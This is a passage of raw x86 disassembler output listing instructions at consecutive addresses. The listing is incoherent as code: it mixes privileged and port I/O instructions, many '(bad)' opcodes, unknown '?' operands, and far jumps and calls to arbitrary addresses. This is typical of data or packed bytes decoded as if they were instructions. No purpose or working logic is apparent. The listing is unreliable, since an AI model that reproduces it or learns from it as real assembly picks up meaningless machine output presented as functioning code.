  41c15d:	outs   dx,BYTE PTR ds:[esi]
  41c15e:	das    
  41c15f:	call   0x29db8e71
  41c164:	add    eax,DWORD PTR [ebp+0x2d7f0938]
  41c16a:	in     ax,dx
  41c16c:	daa    
  41c16d:	jbe    0x41c0f9
  41c16f:	push   ebx
  41c170:	push   0xffffffa3
  41c172:	mov    ah,0x11
  41c174:	fisubr DWORD PTR [ecx-0x1e747933]
  41c17a:	mov    bh,0xb6
  41c17c:	scas   eax,DWORD PTR es:[edi]
  41c17d:	popf   
  41c17e:	dec    eax
  41c17f:	xor    DWORD PTR [ecx+ecx*1-0x72],ebp
  41c183:	adc    ebp,DWORD PTR [edi+0x1bbfc6f7]
  41c189:	lock loope 0x41c15e
  41c18c:	inc    edi
  41c18d:	bound  ecx,QWORD PTR [esi+0x6ba3faf]
  41c193:	neg    ebx
  41c195:	or     eax,DWORD PTR [edi-0x2f]
  41c198:	add    al,0xfa
  41c19a:	and    BYTE PTR ds:0xfccac26e,bl
  41c1a0:	hlt    
  41c1a1:	xchg   esp,eax
  41c1a2:	(bad)  
  41c1a3:	adc    BYTE PTR [esi-0x3d],cl
  41c1a6:	icebp  
  41c1a7:	push   ebx
  41c1a8:	inc    eax
  41c1a9:	js     0x41c1c2
  41c1ab:	xor    al,0xa6
  41c1ad:	bound  ebp,QWORD PTR [ecx+0x48]
  41c1b0:	sbb    ch,bh
  41c1b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1b3:	loopne 0x41c1b1
  41c1b5:	lahf   
  41c1b6:	mov    bl,0x53
  41c1b8:	repz dec eax
  41c1ba:	and    al,0xe4
  41c1bc:	leave  
  41c1bd:	jle    0x41c1e7
  41c1bf:	je     0x41c1e2
  41c1c1:	ins    BYTE PTR es:[edi],dx
  41c1c2:	inc    ebx
  41c1c3:	cld    
  41c1c4:	mov    es,ecx
  41c1c6:	mov    eax,ds:0x6cba895b
  41c1cb:	xchg   BYTE PTR [edx+eax*4+0x54],al
  41c1cf:	adc    DWORD PTR [edx+edi*1+0x611ffd95],0xffffffd1
  41c1d7:	neg    ch
  41c1d9:	adc    ah,BYTE PTR [esi+0x3ae9f164]
  41c1df:	sub    dh,al
  41c1e1:	cdq    
  41c1e2:	mov    ah,0x3c
  41c1e4:	fimul  DWORD PTR [edx]
  41c1e6:	inc    edi
  41c1e7:	(bad)  
  41c1e9:	or     ebp,DWORD PTR [ebp+0x4f]
  41c1ec:	pop    edi
  41c1ed:	vmwrite ebx,ebx
  41c1f0:	daa    
  41c1f1:	fs pop edx
  41c1f3:	and    BYTE PTR [ebx+edi*1-0x4ead7e92],dh
  41c1fa:	ffreep st(5)
  41c1fc:	cmc    
  41c1fd:	loopne 0x41c252
  41c1ff:	scas   al,BYTE PTR es:[edi]
  41c200:	sub    BYTE PTR [eax-0x3bdcd8fd],bl
  41c206:	and    al,0xb9
  41c208:	pop    esp
  41c209:	pop    ds
  41c20a:	popa   
  41c20b:	rcr    BYTE PTR [edi],0xe7
  41c20e:	shr    BYTE PTR [ebx],1
  41c210:	bswap  eax
  41c212:	hlt    
  41c213:	push   ebp
  41c214:	cmp    esi,DWORD PTR [edx-0x7dea7c51]
  41c21a:	sbb    al,0xd6
  41c21c:	pusha  
  41c21d:	(bad)  
  41c21f:	mov    ds:0x50f2fafc,al
  41c224:	add    esi,DWORD PTR [edi-0x77]
  41c227:	sbb    eax,0xa1462d54
  41c22c:	stos   DWORD PTR es:[edi],eax
  41c22d:	outs   dx,BYTE PTR ds:[esi]
  41c22e:	mov    ebp,0x7094e97c
  41c233:	pop    esp
  41c234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c235:	fistp  WORD PTR [edi-0x4f]
  41c238:	and    esp,DWORD PTR [edi]
  41c23a:	mov    ds:0xda90c565,al
  41c23f:	and    edx,0xffffffbf
  41c242:	fidiv  DWORD PTR [ecx]
  41c244:	in     eax,dx
  41c245:	add    edi,DWORD PTR [edx+0x45]
  41c248:	sub    ebp,esi
  41c24a:	(bad)  
  41c24b:	jle    0x41c215
  41c24d:	jne    0x41c263
  41c24f:	out    0x7d,al
  41c251:	or     al,0x11
  41c253:	das    
  41c254:	dec    edi
  41c255:	std    
  41c256:	push   0xf1b8d580
  41c25b:	sbb    DWORD PTR gs:[ebp-0x9],ecx
  41c25f:	or     esi,DWORD PTR [esi]
  41c261:	jb     0x41c2d2
  41c263:	retf   0x8c13
  41c266:	pop    ds
  41c267:	lea    edi,[edi*4-0x52070f4]
  41c26e:	fcmove st,st(2)
  41c270:	mov    ebx,0x5e051e04
  41c275:	push   edi
  41c276:	push   0x1a
  41c278:	jae    0x41c296
  41c27a:	test   DWORD PTR [ebp-0x483fd744],eax
  41c280:	mov    edx,0x9bb0be35
  41c285:	int3   
  41c286:	mov    eax,ds:0x717e2990
  41c28b:	call   0xba8b:0xfd2c00df
  41c292:	push   ss
  41c293:	cmp    DWORD PTR [ebx+0x63a0296f],0x8a08244f
  41c29d:	add    al,0xa6
  41c29f:	enter  0x64fe,0x45
  41c2a3:	xor    BYTE PTR [edi-0x335c04a3],0x4c
  41c2aa:	inc    eax
  41c2ab:	stc    
  41c2ac:	repz sub dl,BYTE PTR [edx+0x1f2ec3bf]
  41c2b3:	add    ch,al
  41c2b5:	adc    al,BYTE PTR [ebx+0x4afd1631]
  41c2bb:	jmp    0x41c332
  41c2bd:	dec    edi
  41c2be:	call   0x5927:0xcd38ff9d
  41c2c5:	jp     0x41c2be
  41c2c7:	push   cs
  41c2c8:	mov    ebp,0xaae8eca0
  41c2cd:	call   0x90eb:0x7cfd1f80
  41c2d4:	jl     0x41c29d
  41c2d6:	jmp    0x2825:0xcf5de93
  41c2dd:	add    eax,DWORD PTR [edi+0xf163823]
  41c2e3:	xor    BYTE PTR [ecx-0x11a6034],dh
  41c2e9:	add    eax,0xb011f07f
  41c2ee:	stos   BYTE PTR es:[edi],al
  41c2ef:	and    bl,BYTE PTR [edi-0x5e]
  41c2f2:	inc    esp
  41c2f3:	data16 bnd jo 0x41c29d
  41c2f7:	xor    BYTE PTR [edx+0x59],al
  41c2fa:	loope  0x41c336
  41c2fc:	cwde   
  41c2fd:	mov    ebx,esi
  41c2ff:	mov    ebx,0xc1fe5eb
  41c304:	and    ebx,DWORD PTR [ebx]
  41c306:	adc    dh,BYTE PTR [ebp-0x3bcea6d]
  41c30c:	pop    es
  41c30d:	dec    eax
  41c30e:	dec    edx
  41c30f:	call   0xf70dead2
  41c314:	test   cl,bl
  41c316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c317:	add    DWORD PTR [ecx+ebx*2+0x2e],ebx
  41c31b:	out    dx,al
  41c31c:	arpl   WORD PTR [edi+ebp*8+0x189d5a3c],di
  41c323:	pop    ebp
  41c324:	mov    edi,0x43497328
  41c329:	xchg   ecx,eax
  41c32a:	repz (bad) 
  41c32c:	jp     0x41c2d4
  41c32e:	jecxz  0x41c2e2
  41c330:	sub    bl,BYTE PTR [ebp+ebp*1-0x48]
  41c334:	lea    ebx,[esi-0x6f]
  41c337:	pop    eax
  41c338:	push   eax
  41c339:	adc    BYTE PTR [esi-0x53],al
  41c33c:	pop    ds
  41c33d:	pop    ss
  41c33e:	jae    0x41c2e1
  41c340:	retf   0x14db
  41c343:	lds    ecx,FWORD PTR [edi]
  41c345:	pop    ebp
  41c346:	fidiv  WORD PTR [edi-0x5c]
  41c349:	xchg   ebx,eax
  41c34a:	sub    BYTE PTR [eax+0x1ba60bc0],cl
  41c350:	adc    eax,0x283200ed
  41c355:	sub    bl,BYTE PTR ds:0x5981ffc7
  41c35b:	(bad)  
  41c35c:	pop    edi
  41c35d:	or     edx,DWORD PTR [ecx-0x43]
  41c360:	(bad)  
  41c361:	mov    edi,0x9cce3039
  41c366:	ret    0xb3bf
  41c369:	mov    eax,ds:0x639c9a88
  41c36e:	cdq    
  41c36f:	fwait
  41c370:	push   ebp
  41c371:	pop    edi
  41c372:	sub    al,0x11
  41c374:	dec    esi
  41c375:	sub    al,0x15
  41c377:	jl     0x41c38c
  41c379:	call   0xe05b:0x60a025af
  41c380:	mov    dl,0x65
  41c382:	imul   ecx,DWORD PTR [ebx],0x3
  41c385:	fisttp DWORD PTR [eax]
  41c387:	sbb    ebp,0x1fe9052
  41c38d:	cwde   
  41c38e:	test   al,0xc6
  41c390:	lds    ebx,FWORD PTR [eax]
  41c392:	push   ecx
  41c393:	xchg   ecx,eax
  41c394:	xchg   DWORD PTR [eax],esi
  41c396:	test   DWORD PTR [eax],0x3dda9d00
  41c39c:	fwait
  41c39d:	add    eax,0x8546740f
  41c3a2:	jbe    0x41c3e7
  41c3a4:	add    DWORD PTR [eax+eax*1+0x63],0xffffffc3
  41c3a9:	sub    al,0x35
  41c3ab:	mov    ds:0x4e8b5eb8,eax
  41c3b0:	xor    esi,DWORD PTR [ebp+0x45]
  41c3b3:	mov    edx,0xcc5a2a2c
  41c3b8:	mov    esp,0xa11d3d
  41c3bd:	cmp    BYTE PTR [edx],dl
  41c3bf:	fld    st(1)
  41c3c1:	jmp    0x66c3475e
  41c3c6:	push   edi
  41c3c7:	inc    eax
  41c3c8:	sbb    ebp,DWORD PTR [ebx-0x7464ecb0]
  41c3ce:	(bad)  
  41c3d0:	es sbb eax,0x71047a10
  41c3d6:	adc    al,0xb3
  41c3d8:	add    bl,BYTE PTR [ebx-0x7bd2a8d3]
  41c3de:	jge    0x41c396
  41c3e0:	xor    eax,0xd6224f33
  41c3e5:	xor    al,0x99
  41c3e7:	inc    esp
  41c3e8:	jge    0x41c39e
  41c3ea:	jl     0x41c3e6
  41c3ec:	inc    ebx
  41c3ed:	rcr    BYTE PTR [esi],1
  41c3ef:	xchg   ecx,ebx
  41c3f1:	push   ebx
  41c3f2:	data16 scas al,BYTE PTR es:[edi]
  41c3f4:	rcl    DWORD PTR [esi+0x3d],cl
  41c3f7:	mov    edi,0x9a5763ac
  41c3fc:	cmp    ebx,DWORD PTR [esi-0x2fb4fe66]
  41c402:	dec    esi
  41c403:	pusha  
  41c404:	add    eax,0x534dcf17
  41c409:	jle    0x41c3e3
  41c40b:	mov    esp,0x869e05f4
  41c410:	jmp    0x4e40:0xd014e7d5
  41c417:	outs   dx,BYTE PTR ds:[esi]
  41c418:	clc    
  41c419:	mov    eax,ds:0xc84ec76d
  41c41e:	das    
  41c41f:	xchg   ebp,eax
  41c420:	addr16 pusha 
  41c422:	es out 0x82,eax
  41c425:	xor    BYTE PTR [esi],dh
  41c427:	stos   DWORD PTR es:[edi],eax
  41c428:	shr    DWORD PTR [eax+0x11],0x5f
  41c42c:	jle    0x41c463
  41c42e:	inc    eax
  41c42f:	int3   
  41c430:	test   DWORD PTR [edi+ebx*2+0x2259c6f1],edi
  41c437:	pop    ss
  41c438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c439:	mov    ah,0x40
  41c43b:	xchg   esi,eax
  41c43c:	pop    ds
  41c43d:	mov    eax,0x65ecf991
  41c442:	add    BYTE PTR [ebp+0x15831e2c],dh
  41c448:	scas   eax,DWORD PTR es:[edi]
  41c449:	push   es
  41c44a:	lea    ebx,[ebx+0x3674af31]
  41c450:	std    
  41c451:	pushf  
  41c452:	imul   ebp,edi,0xa8fbc1f
  41c458:	in     eax,0xcf
  41c45a:	neg    DWORD PTR [edi+0x7d]
  41c45d:	sub    eax,0xc55f04f5
  41c462:	pop    ds
  41c463:	mov    edi,0x2986177b
  41c468:	mov    ebp,0x1edb547
  41c46d:	test   BYTE PTR [edi-0x214b9512],al
  41c473:	and    al,0x2d
  41c475:	imul   ebx,DWORD PTR [esi+0x3f],0xbb7a6695
  41c47c:	fs pop ecx
  41c47e:	xchg   esp,eax
  41c47f:	mov    ds:0xea003184,eax
  41c484:	fldcw  WORD PTR [ebp-0x5c55291e]
  41c48a:	rcl    ecx,1
  41c48c:	cli    
  41c48d:	or     eax,0xb242f883
  41c492:	aas    
  41c493:	dec    ebx
  41c494:	stos   DWORD PTR es:[edi],eax
  41c495:	sbb    esi,DWORD PTR [ecx+0x66630f2e]
  41c49b:	mov    eax,ds:0x426d7656
  41c4a0:	sub    bh,BYTE PTR [eax]
  41c4a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4a3:	pop    ss
  41c4a4:	adc    eax,0xe414232e
  41c4a9:	lock std 
  41c4ab:	fmul   DWORD PTR [ebx]
  41c4ad:	ss lock aas 
  41c4b0:	dec    edi
  41c4b1:	jp     0x41c4a8
  41c4b3:	(bad)
  41c4b6:	loopne 0x41c50a
  41c4b8:	jmp    0xd4810f1f
  41c4bd:	sbb    BYTE PTR [ecx+0x7092b1ca],dh
  41c4c3:	jns    0x41c4fd
  41c4c5:	call   0xa7fc7dd9
  41c4ca:	dec    esp
  41c4cb:	cmc    
  41c4cc:	jbe    0x41c4e2
  41c4ce:	popw   es
  41c4d0:	pop    ebx
  41c4d1:	(bad)  
  41c4d2:	dec    esp
  41c4d3:	fwait
  41c4d4:	mov    ds:0xe09e90fb,eax
  41c4d9:	dec    ebx
  41c4da:	mov    edx,0x81e8fa8a
  41c4df:	xor    DWORD PTR ds:0x717bd5e8,eax
  41c4e5:	jl     0x41c557
  41c4e7:	leave  
  41c4e8:	ins    DWORD PTR es:[edi],dx
  41c4e9:	arpl   WORD PTR [esi+0x5bf88f02],dx
  41c4ef:	int    0x91
  41c4f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4f2:	and    al,0x96
  41c4f4:	dec    esi
  41c4f5:	push   es
  41c4f6:	out    dx,eax
  41c4f7:	shr    BYTE PTR [eax-0x244506b9],0x92
  41c4fe:	imul   eax,DWORD PTR [esi+0x1fd2c410],0x27
  41c505:	sbb    DWORD PTR [ebx-0x709808f6],ebp
  41c50b:	test   al,0xd5
  41c50d:	rcl    DWORD PTR [esi],1
  41c50f:	rcr    BYTE PTR [esi+0x7272ece9],0x43
  41c516:	test   dl,dh
  41c518:	xor    al,0x5b
  41c51a:	or     ah,dl
  41c51c:	pop    es
  41c51d:	sub    DWORD PTR [ebx+esi*8+0x1f33caf2],edi
  41c524:	in     eax,dx
  41c525:	popf   
  41c526:	cdq    
  41c527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c528:	ins    DWORD PTR es:[edi],dx
  41c529:	xor    BYTE PTR [ebp+0x7d],ah
  41c52c:	dec    ecx
  41c52d:	loopne 0x41c5a3
  41c52f:	jnp    0x41c53d
  41c531:	cmp    bl,ah
  41c533:	hlt    
  41c534:	dec    eax
  41c535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c536:	lock leave 
  41c538:	jae    0x41c4e9
  41c53a:	cli    
  41c53b:	push   esp
  41c53c:	cli    
  41c53d:	ds cdq 
  41c53f:	mov    al,0x60
  41c541:	sub    eax,0xf5698d72
  41c546:	add    bl,BYTE PTR [esi+0x4b260c3a]
  41c54c:	jae    0x41c5cc
  41c54e:	call   0xa79bb316
  41c553:	aas    
  41c554:	mov    al,ds:0x7ca43e58
  41c559:	and    al,0x45
  41c55b:	mov    ch,0xb6
  41c55d:	loop   0x41c540
  41c55f:	outs   dx,BYTE PTR ds:[esi]
  41c560:	dec    ecx
  41c561:	or     ch,0x87
  41c564:	jge    0x41c508
  41c566:	add    ch,ch
  41c568:	(bad)  
  41c569:	xchg   esi,eax
  41c56a:	(bad)
  41c56e:	and    BYTE PTR [edi+edi*2-0x27],ch
  41c572:	or     eax,0x14802960
  41c577:	jecxz  0x41c521
  41c579:	pushf  
  41c57a:	cmp    al,0x3f
  41c57c:	xor    eax,DWORD PTR [ebx-0x71d6c21b]
  41c582:	or     ebp,DWORD PTR [esi+0x22]
  41c585:	test   DWORD PTR [edx-0x5eb36506],0x82d6d9cc
  41c58f:	stc    
  41c590:	loopne 0x41c520
  41c592:	retf   0x25d1
  41c595:	jno    0x41c532
  41c597:	push   esp
  41c598:	aaa    
  41c599:	inc    edx
  41c59a:	mov    ah,0x41
  41c59c:	jmp    0xafbecfa5
  41c5a1:	mov    esp,ebp
  41c5a3:	jp     0x41c571
  41c5a5:	cmp    eax,0x9fe0fae8
  41c5aa:	adc    ah,bl
  41c5ac:	loop   0x41c580
  41c5ae:	mov    ds:0xf45c126c,al
  41c5b3:	add    DWORD PTR [ebx+0x4b],0x62
  41c5b7:	push   esi
  41c5b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b9:	jns    0x41c590
  41c5bb:	fisttp WORD PTR [edi+ebp*1+0x405cf640]
  41c5c2:	adc    BYTE PTR [esi-0x74],dl
  41c5c5:	daa    
  41c5c6:	aam    0x49
  41c5c8:	ror    DWORD PTR [edx+0x74347674],1
  41c5ce:	cmp    ebp,DWORD PTR [esi]
  41c5d0:	jmp    0x20be:0x4bb12a36
  41c5d7:	imul   eax,DWORD PTR [ebp-0xb],0xcc0bf053
  41c5de:	out    0xdd,al
  41c5e0:	call   0x8bf519d6
  41c5e5:	xchg   ebp,eax
  41c5e6:	test   eax,0x439faa4
  41c5eb:	and    DWORD PTR [edi-0x28f653a3],eax
  41c5f1:	nop
  41c5f2:	cmp    DWORD PTR [ecx+ebp*4-0x3c314fe],ecx
  41c5f9:	inc    esp
  41c5fa:	mov    BYTE PTR [eax+0x1f278f07],bh
  41c600:	aad    0x53
  41c602:	dec    eax
  41c603:	jge    0x41c5e7
  41c605:	jmp    FWORD PTR [eax-0x1d]
  41c608:	add    eax,0x98aff131
  41c60d:	xchg   ebp,eax
  41c60e:	pop    ss
  41c60f:	imul   esp,DWORD PTR [ecx],0xb6f085fc
  41c615:	xchg   DWORD PTR [edi],ecx
  41c617:	stc    
  41c618:	aam    0x6
  41c61a:	mov    esp,0xc25e0d36
  41c61f:	and    edx,DWORD PTR [edi-0x70]
  41c622:	lds    edi,FWORD PTR [ecx-0x69]
  41c625:	dec    ebx
  41c626:	stc    
  41c627:	mov    eax,0x43278e4b
  41c62c:	mov    al,0xc
  41c62e:	fmul   QWORD PTR [edi-0x57489f12]
  41c634:	sub    BYTE PTR [ebx-0x2],bh
  41c637:	out    0x10,eax
  41c639:	ret    
  41c63a:	sbb    BYTE PTR [ebp-0x2a],0x56
  41c63e:	jno    0x41c609
  41c640:	jmp    0xf81539c9
  41c645:	popa   
  41c646:	adc    eax,0x83dc93d6
  41c64b:	mov    bl,0x8e
  41c64d:	mov    al,ds:0x7b1703e9
  41c652:	push   0xa717a8bd
  41c657:	jne    0x41c64b
  41c659:	and    ebp,DWORD PTR [eax-0x17396db4]
  41c65f:	jmp    0x6d37:0x759a911b
  41c666:	cmp    edx,ecx
  41c668:	jmp    0x41c629
  41c66a:	clc    
  41c66b:	cli    
  41c66c:	sbb    al,0xdf
  41c66e:	pop    ebp
  41c66f:	pop    edx
  41c670:	pop    es
  41c671:	pop    ecx
  41c672:	push   esp
  41c673:	(bad)  
  41c674:	stos   DWORD PTR es:[edi],eax
  41c675:	jnp    0x41c67c
  41c677:	mov    bl,0xa3
  41c679:	inc    edx
  41c67a:	push   0x8fc06576
  41c67f:	jo     0x41c6e5
  41c681:	fwait
  41c682:	test   BYTE PTR [eax-0x5eee1a55],al
  41c688:	cmp    ah,BYTE PTR [esp+ecx*2+0x1bfe61b]
  41c68f:	shl    BYTE PTR [ebp+0x37],cl
  41c692:	pop    esi
  41c693:	lock in al,dx
  41c695:	sub    ebx,DWORD PTR [ebp-0x69f95807]
  41c69b:	dec    esi
  41c69c:	daa    
  41c69d:	inc    ebx
  41c69e:	gs mov esi,0xb0231f4a
  41c6a4:	(bad)  
  41c6a6:	pop    ds
  41c6a7:	xor    ebx,DWORD PTR [edi+ebx*4]
  41c6aa:	adc    bl,BYTE PTR [ebx-0x310c15c4]
  41c6b0:	pop    ebp
  41c6b1:	push   eax
  41c6b2:	jnp    0x41c71f
  41c6b4:	outs   dx,BYTE PTR ds:[esi]
  41c6b5:	test   dh,bh
  41c6b7:	mov    cl,0x6b
  41c6b9:	icebp  
  41c6ba:	sub    eax,0xed69ced9
  41c6bf:	test   eax,0xfd46de92
  41c6c4:	jne    0x41c67f
  41c6c6:	lea    eax,[ebx+0x53160416]
  41c6cc:	mov    edi,0x77e291e4
  41c6d1:	add    ebx,esi
  41c6d3:	enter  0xe542,0xab
  41c6d7:	out    0x5a,eax
  41c6d9:	(bad)  
  41c6da:	in     al,dx
  41c6db:	ret    0x46a2
  41c6de:	cs addr16 idiv ah
  41c6e2:	imul   edi,DWORD PTR [ebp-0x527d0d30],0xffffffd8
  41c6e9:	mov    WORD PTR [ecx+0x5f],fs
  41c6ec:	int    0xa
  41c6ee:	enter  0xc47a,0x75
  41c6f2:	fwait
  41c6f3:	ret    
  41c6f4:	aad    0xc6
  41c6f6:	stos   DWORD PTR es:[edi],eax
  41c6f7:	hlt    
  41c6f8:	xlat   BYTE PTR ds:[ebx]
  41c6f9:	fdiv   QWORD PTR [ebp-0x49247622]
  41c6ff:	add    al,0xaf
  41c701:	(bad)  
  41c702:	fcmovnbe st,st(5)
  41c704:	pop    es
  41c705:	or     al,0xdc
  41c707:	jno    0x41c68d
  41c709:	and    cl,al
  41c70b:	mov    eax,ds:0xbc8e6373
  41c710:	adc    eax,0xc9e79ff5
  41c715:	popa   
  41c716:	repz and eax,0x15eea20c
  41c71c:	aam    0xcb
  41c71e:	sbb    bh,dh
  41c720:	test   al,0xea
  41c722:	into   
  41c723:	out    dx,eax
  41c724:	xchg   esp,eax
  41c725:	jmp    0x2653:0x2d0ecdb5
  41c72c:	add    eax,0x8e370343
  41c731:	into   
  41c732:	jl     0x41c7a2
  41c734:	push   ss
  41c735:	dec    esp
  41c736:	xchg   DWORD PTR [edi-0x2e],ebp
  41c739:	ins    DWORD PTR es:[edi],dx
  41c73a:	xchg   ebp,eax
  41c73b:	into   
  41c73c:	dec    esp
  41c73d:	(bad)  
  41c73f:	retf   0x5190
  41c742:	test   BYTE PTR [ecx],bh
  41c744:	push   ebp
  41c745:	test   esi,esp
  41c747:	xchg   ecx,eax
  41c748:	ficom  DWORD PTR [ecx]
  41c74a:	mov    dh,bh
  41c74c:	fbld   TBYTE PTR [edi+0x5a4d8213]
  41c752:	rcl    ebx,0x55
  41c755:	gs popa 
  41c757:	lds    ebx,FWORD PTR [ecx]
  41c759:	popa   
  41c75a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c75b:	xchg   ebp,eax
  41c75c:	lods   al,BYTE PTR ds:[esi]
  41c75d:	mov    ch,0xb2
  41c75f:	cmp    ecx,DWORD PTR [ebp+0x301436b8]
  41c765:	cmp    esp,esp
  41c767:	iret   
  41c768:	int3   
  41c769:	push   esi
  41c76a:	cmp    DWORD PTR [edx-0x2cc60f91],ebx
  41c770:	(bad)  
  41c772:	mov    ebp,DWORD PTR [edi]
  41c774:	shl    DWORD PTR [ebx+ecx*4+0x8],0x65
  41c779:	adc    DWORD PTR [edi-0x4f28d57a],ecx
  41c77f:	jne    0x41c7e1
  41c781:	push   ebp
  41c782:	ud2    
  41c784:	cld    
  41c785:	pop    ebx
  41c786:	icebp  
  41c787:	jle    0x41c807
  41c789:	pop    esi
  41c78a:	pusha  
  41c78b:	or     DWORD PTR [ecx+0x64],eax
  41c78e:	sahf   
  41c78f:	adc    al,0x1
  41c791:	xor    eax,0x4a20ec8
  41c796:	push   edi
  41c797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c798:	mov    al,0x1d
  41c79a:	push   ds
  41c79b:	mov    eax,0x6d3e3e9b
  41c7a0:	inc    esi
  41c7a1:	mov    BYTE PTR [edx+0x5f5a7dac],ah
  41c7a7:	or     ecx,ebx
  41c7a9:	pop    ecx
  41c7aa:	cs mov dh,bl
  41c7ad:	adc    al,BYTE PTR [ebx-0x7c]
  41c7b0:	repz and al,0x2d
  41c7b3:	mov    ds:0x9de59226,eax
  41c7b8:	int    0xc3
  41c7ba:	cmp    ebx,DWORD PTR [ebx-0x5b]
  41c7bd:	pop    ds
  41c7be:	push   ebp
  41c7bf:	or     DWORD PTR [edx+0x43073d74],ebx
  41c7c5:	xchg   BYTE PTR [ebx],bh
  41c7c7:	(bad)  
  41c7c8:	adc    BYTE PTR [esi],dl
  41c7ca:	fidiv  DWORD PTR [edi-0x55cd60de]
  41c7d0:	and    bh,BYTE PTR [esi-0xd]
  41c7d3:	out    0xfa,eax
  41c7d5:	data16 mov al,ds:0x69046b5b
  41c7db:	cmc    
  41c7dc:	daa    
  41c7dd:	add    ah,BYTE PTR [ebx+ebx*1]
  41c7e0:	mov    ds:0x48251a35,eax
  41c7e5:	jl     0x41c7c0
  41c7e7:	mov    ?,WORD PTR [edx]
  41c7e9:	rol    DWORD PTR [edx],cl
  41c7eb:	jns    0x41c847
  41c7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7ee:	(bad)
  41c7f1:	xlat   BYTE PTR ds:[ebx]
  41c7f2:	mov    eax,ds:0x96a773d5
  41c7f7:	call   0x31c4011f
  41c7fc:	aad    0x90
  41c7fe:	iret   
  41c7ff:	out    0x27,eax
  41c801:	pop    edx
  41c802:	daa    
  41c803:	pop    ss
  41c804:	addr16 or edx,ebx
  41c807:	mov    edi,0x20316c28
  41c80c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c80d:	loope  0x41c825
  41c80f:	retf   0xf398
  41c812:	mov    esp,cs
  41c814:	lea    ecx,[edx-0x3098c0b4]
  41c81a:	pop    eax
  41c81b:	push   edx
  41c81c:	or     ah,dl
  41c81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c81f:	loope  0x41c7a3
  41c821:	fsub   DWORD PTR [eax]
  41c823:	add    ch,bl
  41c825:	xor    al,0x53
  41c827:	add    DWORD PTR [edi],esp
  41c829:	inc    edi
  41c82a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c82b:	sbb    dh,dl
  41c82d:	imul   ebx,DWORD PTR ss:[esi+0x10],0x6
  41c832:	or     al,0x2
  41c834:	fsubr  DWORD PTR [ecx+0x64c1cf54]
  41c83a:	stos   DWORD PTR es:[edi],eax
  41c83b:	add    al,BYTE PTR [eax+ecx*8-0x2e]
  41c83f:	dec    ebx
  41c840:	repz mov WORD PTR [eax],?
  41c843:	sbb    al,0xf0
  41c845:	nop
  41c846:	lea    ecx,ss:[ecx-0x5f1f9d02]
  41c84d:	cmp    BYTE PTR [edx-0x20309156],bl
  41c853:	sub    ebp,DWORD PTR [esi+0x3aaa1a16]
  41c859:	and    ebp,esi
  41c85b:	aaa    
  41c85c:	xor    BYTE PTR [eax+0x53],ch
  41c85f:	retf   0xb323
  41c862:	rol    BYTE PTR [ebx-0x79],cl
  41c865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c866:	push   es
  41c867:	clc    
  41c868:	pusha  
  41c869:	inc    esi
  41c86a:	sub    esp,ecx
  41c86c:	out    dx,eax
  41c86d:	fisttp WORD PTR [ebp+0x48d49311]
  41c873:	sbb    ah,BYTE PTR [edx-0x71]
  41c876:	pop    edi
  41c877:	sbb    DWORD PTR [esi-0x6c],ebx
  41c87a:	mov    esi,0xe4b716cf
  41c87f:	rcr    DWORD PTR [ecx+eiz*8+0x14],1
  41c883:	pop    esp
  41c884:	add    ah,dl
  41c886:	jecxz  0x41c88f
  41c888:	loope  0x41c84c
  41c88a:	sar    DWORD PTR [edx+0x488e01c3],1
  41c890:	cmp    DWORD PTR [esi+0x1],edi
  41c893:	xchg   ebx,eax
  41c894:	xor    BYTE PTR [esi+0x395b4dcc],dh
  41c89a:	imul   eax,DWORD PTR [eax+ecx*1+0x212f97d5],0xffffffd7
  41c8a2:	adc    al,0xe2
  41c8a4:	pop    ebx
  41c8a5:	nop
  41c8a6:	test   BYTE PTR [esi+eax*2+0x6c4c90c8],bl
  41c8ad:	popa   
  41c8ae:	xchg   esi,eax
  41c8af:	arpl   WORD PTR [eax],sp
  41c8b1:	push   cs
  41c8b2:	aas    
  41c8b3:	sub    DWORD PTR [esi+0x4dd53aac],0xef5f7e40
  41c8bd:	mov    ebp,0xb7c575ff
  41c8c2:	sbb    bl,BYTE PTR [esi]
  41c8c4:	push   esi
  41c8c5:	jge    0x41c8ed
  41c8c7:	out    0xad,al
  41c8c9:	out    dx,eax
  41c8ca:	inc    edi
  41c8cb:	call   0x8397:0x171ff495
  41c8d2:	push   edx
  41c8d3:	sub    edx,DWORD PTR [ebp+0xe]
  41c8d6:	dec    ebp
  41c8d7:	push   es
  41c8d8:	dec    eax
  41c8d9:	push   edx
  41c8da:	sar    DWORD PTR [ebx+0x68],0xec
  41c8de:	sbb    BYTE PTR [eax],al
  41c8e0:	in     eax,0x70
  41c8e2:	loope  0x41c8d1
  41c8e4:	xchg   DWORD PTR [edi],ebp
  41c8e6:	push   ss
  41c8e7:	sub    dh,BYTE PTR [eax+0x54]
  41c8ea:	or     eax,0xdc97bc1f
  41c8ef:	mov    ss,WORD PTR [ecx]
  41c8f1:	pop    edi
  41c8f2:	add    al,0x49
  41c8f4:	(bad)  
  41c8f5:	repz cld 
  41c8f7:	dec    eax
  41c8f8:	stos   DWORD PTR es:[edi],eax
  41c8f9:	pop    es
  41c8fa:	repnz fstp TBYTE PTR [ecx]
  41c8fd:	cld    
  41c8fe:	in     al,dx
  41c8ff:	daa    
  41c900:	popf   
  41c901:	shr    DWORD PTR [ebx+0x12],1
  41c904:	pop    ebp
  41c905:	jge    0x41c934
  41c907:	enter  0x6390,0xbe
  41c90b:	sti    
  41c90c:	out    0xc,al
  41c90e:	iret   
  41c90f:	rcl    BYTE PTR [eax-0x26513b4e],cl
  41c915:	test   eax,0x636af52d
  41c91a:	add    cl,BYTE PTR ss:[edi]
  41c91d:	in     eax,0xf
